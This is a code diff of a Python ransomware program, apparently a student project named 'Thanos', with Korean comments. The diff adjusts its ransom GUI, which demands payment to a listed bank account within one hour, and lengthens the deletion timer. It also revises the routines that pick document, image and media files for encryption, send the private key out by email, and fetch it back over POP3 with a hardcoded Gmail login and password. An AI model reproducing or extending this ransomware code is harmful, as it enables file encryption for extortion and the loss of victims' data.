@@ -13,21 +13,24 @@ import poplib
 from email.mime.text import MIMEText
 
 # gui 라이브러리
-'''
-암호화 / 복호화 기존에 1,2,3 
-while 루프 나오던 건 main_test
-gui랑 통합하고 있는 게 integrate_gui 
-'''
 import tkinter
 from testFile import thanos
 
-timeLimit = 5
 iv = os.urandom(16)
 '''
 1124 수정사항
 클래스 이름 대문자로 시작해서 MyTk, Realmain 카멜식
 함수 이름은 소문자로 시작해서 카멜식
 변수 이름은 소문자로 시작해서 언더바(_)를 사용하여 나타냄
+'''
+
+
+'''
+11/25
+메일 전송/수신 완료
+
+
+
 '''
 
 
@@ -42,15 +45,15 @@ class MyTk:
         self.window.configure(background="black")
 
         self.l_text = tkinter.Label(self.window,
-                                    text="타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\n",
+                                    text="\n타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\n",
                                     fg="red", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
 
-        self.l_timer = tkinter.Label(self.window, text="타이머 시작 = 5", fg="red", bg="black", font='Helvetica 14 bold')
+        self.l_timer = tkinter.Label(self.window, text="타이머 시작", fg="red", bg="black", font='Helvetica 14 bold')
         self.l_timer.pack()
 
         self.l_input = tkinter.Label(self.window,
-                                     text="password:",
+                                     text="\npassword:",
                                      fg="red", bg="black", font='Helvetica 14 bold')
         self.l_input.pack()
 
@@ -125,6 +128,7 @@ class MyTk:
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 def startTimer(gui, path, ext=None):
+    sleep(1)
     print("타이머를 시작합니다")
 
     antdd_filelist = []
@@ -157,7 +161,7 @@ def startTimer(gui, path, ext=None):
     ###
     #print("[" + ",".join(antdd_filelist) + "]")
 
-    clock(gui, 5, antdd_filelist)
+    clock(gui, 300, antdd_filelist)
 
 
 
@@ -296,14 +300,15 @@ class RealMain:
 
     # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
-    def listFiles(self, path):
+    ##! 파일 리스팅함수 약간 수정
+    def encListFiles(self, path):
         filelist = []
         extlist = \
             ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
              'jpg', 'jpeg', 'png', 'gif',
              'mp3', 'wav', 'wma',
              'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
-        #print("os.listdir(): \n", os.listdir())
+        print("os.listdir(): \n", os.listdir())
         for name in os.listdir(path):
             if os.path.isfile(os.path.join(path, name)):
                 for i in extlist:
@@ -312,18 +317,19 @@ class RealMain:
                     else:
                         continue
 
-        #print("filelist: \n", filelist)
+        print("enc_filelist: \n", filelist)
         return filelist
 
     def decListFiles(self, path):
-        dec_filelist = []
+        filelist = []
         for name in os.listdir(path):
             if name.endswith(".antdd"):
-                dec_filelist.append(name)
+                filelist.append(name)
             else:
                 continue
-        #print("dec_filelist: \n", dec_filelist)
-        return dec_filelist
+        print("dec_filelist: \n", filelist)
+        return filelist
+    ##! 여기까지
 
     # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////실제로 실행되는 함수
     def run(self):
@@ -345,7 +351,7 @@ class RealMain:
         smtp.quit()
         print('\n생성된 private key 를 메일로 보내기 성공\n')
 
-        enc_targetlist = self.listFiles(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
+        enc_targetlist = self.encListFiles(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
 
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
@@ -369,35 +375,40 @@ class RealMain:
         # mail 확인
         print("메일 읽기 시작")
 
+        #서버와 연동/ 로그인
         SERVER = "pop.gmail.com"
         server = poplib.POP3_SSL(SERVER)
         server.user('secureantdd@gmail.com')
         server.pass_('antdd1234')
 
+        # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석!
         for i in range(len(server.list()[1])):
             msg = server.retr(i + 1)[1]
-            text = b'\n'.join(msg).decode()
+            text = b'\n'.join(msg).decode() # 메일의 전체 내용을 읽어옴
             idx = text.find('Subject:')
             text = text[idx + 9:]
-            uuid = text[: text.find('\n')]
-            key = text[42:]
+            uuid = text[: text.find('\n')] # 메일의 수신자(mac 주소) 를 가져온다
+            key = text[42:] # 메일에 들어있는 해당 주소의 private key
 
-            # print("분석한 메일=>", i+1, "번째 메일 ,",uuid,"에게 온 메일, key=",key)
-
-            if uuid == str(self.UUID):  # / 해당 호스트의 메일 찾음
+            # 만약 같은 주소의 사용자에게 온 메일이 있다면
+            if uuid == str(self.UUID):
+                # 보기 좋게 출력 한것. 실제로는 주소 당 하나의 메일이므로 삭제할 print 문
                 print(i + 1, "번째 메일입니다")
+
+                #만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                 if key.strip()==gui_input.strip():
-                    print("뭐야 왜 동작안해")
-                    for file in self.decListFiles(os.getcwd()):  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
-                        dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), file, out_filename=None)
-                        # 입력한 비밀키를 바탕으로 dec 근데 파라미터 private_key 아니고 input이여야하는데 encoding 문제배제하려고 일단은 private key 사용함 11/24
+                    ##! 복호화 및 타겟파일 삭제
+                    dec_targetlist = self.decListFiles(os.getcwd())
+                    for dec_target in dec_targetlist:  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
+                        dec(PKCS1_OAEP.new(RSA.importKey(key)), dec_target, out_filename=None)
+                        os.remove(dec_target)
+                    ##! 여기까지
                     self.myGui.finalGui()
                     print("복호화 성공!")
-                    #self.myGui.window.destroy()
-                    return
-            # auto_remove 호출
+                    # auto_remove 호출
             else:
                 print("\nself.test_input_key!=input")
+
 
 
 if __name__ == "__main__":
